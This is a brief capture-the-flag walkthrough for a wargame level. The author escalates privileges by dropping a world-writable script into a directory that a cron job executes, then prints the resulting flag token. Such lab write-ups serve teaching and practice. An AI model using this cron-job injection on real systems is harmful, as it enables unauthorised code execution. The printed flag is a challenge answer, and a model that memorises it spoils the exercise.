## Walkthrought : 
- The first day i found nothing :(
- The next day when i connected using ssh to level05 
- I got a msg telling i have a new email
- checked /var/mail and found cron job which runs a script **/usr/sbin/openarenaserver**
- The script loop throught all files in /opt/openarenaserver/, exucute , and delete each one of them.
- now its obvious i created a file , put getflag inside of it, and redirect the output to /var/tmp

## command
```
echo "getflag >> /var/tmp/flag" > /opt/openarenaserver/script.sh && chmod 777 /opt/openarenaserver/script.sh
```
+ waited two minutes and i got the flag yay!
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```